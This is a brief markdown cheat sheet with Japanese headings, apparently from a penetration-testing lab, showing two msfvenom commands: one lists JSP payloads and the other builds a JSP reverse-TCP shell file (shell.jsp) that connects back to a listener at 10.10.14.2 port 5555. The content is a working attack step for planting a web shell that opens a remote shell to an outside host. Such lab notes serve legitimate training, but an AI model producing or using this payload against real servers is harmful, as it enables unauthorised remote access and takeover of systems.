### list検索
```bash
 msfvenom --list payload | grep jsp
```
![image](https://github.com/user-attachments/assets/3f75d8ee-69d7-4a0c-bd7c-9291757d6a93)

---

### payload作成
```bash
msfvenom --payload java/jsp_shell_reverse_tcp --format raw --out shell.jsp LHOST=10.10.14.2 LPORT=5555
```
